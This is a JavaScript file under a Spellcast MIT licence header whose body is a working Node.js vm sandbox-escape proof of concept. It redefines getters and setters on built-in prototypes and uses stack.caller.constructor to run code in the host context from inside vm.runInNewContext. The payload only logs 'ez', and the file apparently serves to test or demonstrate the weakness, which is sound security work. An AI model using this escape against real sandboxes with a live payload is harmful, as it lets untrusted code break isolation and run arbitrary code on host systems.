/*
	Spellcast

	Copyright (c) 2014 - 2019 Cédric Ronvel

	The MIT License (MIT)

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
*/
vm=require('vm');


function alertMe() {
  var Object = {}.constructor;
  var o=Object.create(Error.prototype);
  function stack(){
    stack.caller.constructor('try{console.log("ez")}catch(e){}')();
    return function() {return '0'};
  };
  var properties = {};
  [
    'create', 'defineProperty', 'defineProperties',
    'typeof', 'void', 'new', 'parseInt', 'parseFloat', 'eval',
    'RegExp', 'Number', 'String', 'Function', 'Array', 'Object', 'Date', 'Buffer',
    'isArray', 'isBuffer', 'matches', 'exec', 'slice', 'substr', 'substring',
    'indexOf', 'forEach', 'map', 'filter', 'reduce', 'some', 'all', 'any', '_', '$', 'format',
    '', 'null', 'undefined', 'var', 'function',
    'toString','toJSON','constructor','valueOf',
    'length','0','1',
    'value','message','stack',
    'index','lastIndex','source','multiline','global','ignoreCase',
    'name','arguments','caller','callee','prototype', 'call', 'apply',
    '__proto__','__defineGetter__','__defineSetter__'
  ].forEach(function(key) {
    properties[key] = {get: stack, set: stack, configurable: false, enumerable: true};
  });  
  var defineProperties = Object.defineProperties;
  [
    o,
    Function.prototype,
    Number.prototype,
    String.prototype,
    Object.prototype,
    Array.prototype,
    Array,
    RegExp.prototype,
    Error.prototype,
    Math,
    Date.prototype,
    Date,
    (function(){return this})(),
    Object
  ].forEach(function(item) {
    try {
      defineProperties(item, properties)
    }
    catch(e) {}
  });
  return o;
}



var str, out;

str=alertMe.toString()+';alertMe()';

try{
  vm.runInNewContext(str);
} catch(e) {
  console.error(e.stack);
} ; 0

